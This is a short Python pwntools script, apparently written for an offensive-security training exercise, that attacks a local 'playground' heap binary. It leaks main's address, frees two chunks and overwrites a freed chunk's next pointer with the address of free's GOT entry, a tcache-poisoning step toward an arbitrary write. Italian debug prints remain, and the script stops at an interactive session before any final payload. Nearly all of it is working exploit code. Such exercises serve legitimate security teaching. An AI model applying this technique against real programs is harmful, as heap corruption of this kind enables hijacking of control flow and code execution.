from pwn import*

r = process("./playground")
#r = remote("bin.training.offdef.it", 10101)

gdb.attach(r,
'''
b *(main+243)
''')

input("wait")

def malloc(n):
	r.sendline(b"malloc " + bytes(str(n),encoding="utf-8"))
	r.recvuntil(b"==> ")
	pointer = r.recv()[:-1]
	return pointer

def free(pointer):
	r.sendline(b"free " + pointer)
	r.recv()

def write(pointer,n,what_to_write):
	r.sendline(b"write " + pointer + b" " + bytes(str(n),encoding="utf-8"))
	r.send(what_to_write)
	r.recv()

r.recvuntil(b"main: ")
app = r.recv()[:-3]
main_address = int(app,16)

print("PROVA -> stampa main address")
print(hex(main_address))


c1 = malloc(0x8)
c2 = malloc(0x8)

print("malloc fatte")

free(c1);
free(c2);

print("free fatte")

offset_free_got = 0x2e04

input("wait before writing")
write(c2, 0x10, p64(main_address+offset_free_got))

print("stampa main address + offset_free_got:")
print(hex(main_address+offset_free_got))
print("Scrittura dell'indirizzo dell'arbitrary chunk fatta")




r.interactive()
